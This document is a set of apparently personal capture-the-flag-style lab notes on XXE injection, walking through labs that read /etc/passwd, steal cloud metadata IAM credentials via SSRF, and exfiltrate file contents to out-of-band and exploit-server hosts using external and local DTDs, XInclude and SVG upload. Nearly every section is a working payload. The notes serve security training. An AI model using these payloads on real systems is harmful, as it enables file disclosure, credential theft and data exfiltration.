# XML external entity (XXE) Injection
XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

### LAB: Exploiting XXE using external entities to retrieve files
Use this as the body for the `POST /product/stock HTTP/2` request:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>

This XXE payload defines an external entity `&xxe;` whose value is the contents of the `/etc/passwd` file and uses the entity within the `productId` value. The data then is sent within the appilcation's response.

### LAB: Exploiting XXE to perform SSRF attacks
Same as above lab:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>

How to get to this path `/latest/meta-data/iam/security-credentials/admin`? Just follow the value in the error message respond by the server.

### LAB: Blind XXE with out-of-band interaction
Use this as the body of the `POST /product/stock HTTP/2` request to trigger a DNS lookup to the Collaborator domain:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://p1r24ceyni3yrv9h0leoinb8xz3qrgf5.oastify.com">]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>

### LAB: Blind XXE with out-of-band interaction via XML parameter entities
Sometimes, XXE attacks using regular entities (used in the document's context) are blocked, due to some input validation by the application or some hardening of the XML parser that is being used.
In this situation, you might be able to use XML parameter entities instead (`%xee;`). XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD. Use this as the body of the `POST /product/stock HTTP/2` request:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://1hjekoua3uja77ptgxu0yzrkdbj27uvj.oastify.com"> %xxe; ]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>

### LAB: Exploiting blind XXE to exfiltrate data using a malicious external DTD
At the exploit server, declare these paramater entities:

    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://exploit-0a88009e046a416381ab2e72011800da.exploit-server.net/exploit/%file;'>">

- `%file;`: loads the contents of `/etc/hostname`
- `%eval;`: create another parameter entity (`%exfiltrate;`) by injecting `&#x25;`, which is a hexadecimal representation of `%` (used to escape it in XML).
- `%exfiltrate;`: cause the server to make a request to the exploit server with the contents of /etc/hostname.

Now make the victim visit the exploit server and use the entities we declared to make the attack happen by using this as the body of the `POST /product/stock HTTP/2` request:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo 
        [<!ENTITY % xxe SYSTEM "https://exploit-0a88009e046a416381ab2e72011800da.exploit-server.net/exploit"> 
            %xxe;
            %eval;
            %exfiltrate;
        ]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>

### LAB: Exploiting blind XXE to retrieve data via error messages
At the exploit server, declare these paramater entities:

    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexist/%file;'>">

- `%file;`: loads the contents of `/etc/passwd`
- `%eval;`: create another parameter entity (`%error;`) by injecting `&#x25;`, which is a hexadecimal representation of `%` (used to escape it in XML).
- `%error;`: cause the server to make a request to a nonexistent file which cause the logging of error message.

Now make the victim visit the exploit server and use the entities we declared to make the server log error message by using this as the body of the `POST /product/stock HTTP/2` request:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo 
        [<!ENTITY % xxe SYSTEM "https://exploit-0a3900dd03df199a82f8d4ec01e00003.exploit-server.net/exploit"> 
            %xxe;
            %eval;
            %error;
        ]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>

### LAB: Exploiting XXE to retrieve data by repurposing a local DTD
The above technique works fine with external DTD, but it won't normally work with an internal DTD.
So what about blind XXE vulnerabilities when out-of-band interactions are blocked? Try invoke a DTD file that happens to exist on the local filesystem and repurposing it to redefine an existing entity in a way that triggers a parsing error containing sensitive data.
First locate a local DTD. Use this as the body of `POST /product/stock HTTP/2` request:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
        <!ENTITY % localDTD SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    ]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>

Base on the error messages (no error if the file exists), we found a local DTD: `/usr/share/yelp/dtd/docbookx.dt`.
Next google for this DTD file and found an entity that we can redefine `ISOamsa`. Now use this XML to redefine `ISOamsa` and make it trigger an error message containing the `/etc/passwd` content:

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
        <!ENTITY % localDTD SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
        <!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
        '> %localDTD;
    ]>
    <stockCheck>
        <productId>1</productId>
        <storeId>1</storeId>
    </stockCheck>

### LAB: Exploiting XInclude to retrieve files
To perform an `XInclude` attack, we need to reference the `XInclude` namespace and provide the path to the file that you wish to include. Use this as the value of `productId` in the `POST /product/stock HTTP/2` request:

    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>

### LAB: Exploiting XXE via image file upload
Submit a `svg` file with the `/etc/hostname` content:

    <?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "file:///etc/hostname">
    ]>
    <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
        <text x="10" y="50" font-size="70">&xxe;</text>
    </svg>
